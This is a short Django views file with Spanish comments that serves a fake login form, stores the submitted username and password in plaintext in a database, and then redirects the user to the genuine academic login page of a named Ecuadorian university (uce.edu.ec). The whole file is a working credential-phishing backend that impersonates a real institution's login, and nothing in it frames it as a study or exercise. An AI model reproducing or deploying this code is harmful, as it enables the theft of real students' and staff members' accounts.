from django.shortcuts import render, redirect
from .models import Usuario

# Vista para renderizar el formulario de login
def login(request):
    return render(request, 'login.html')

# Vista para guardar el login y redirigir
def guardar_login(request):
    if request.method == 'POST':
        # Obtener los datos del formulario
        user = request.POST['j_username']
        password = request.POST['j_password']
        
        # Crear un nuevo objeto de Usuario y guardar la contraseña
        login = Usuario.objects.create(user=user, password=password)
        
        # Redirigir a la URL especificada después de guardar
        return redirect('https://academico.uce.edu.ec/aplicacion/academico/generalidades/login.jsp')
    else:
        # Si no es una solicitud POST, redirigir al formulario de login
        return render(request, 'login.html')  # Renderiza de nuevo el formulario login.html
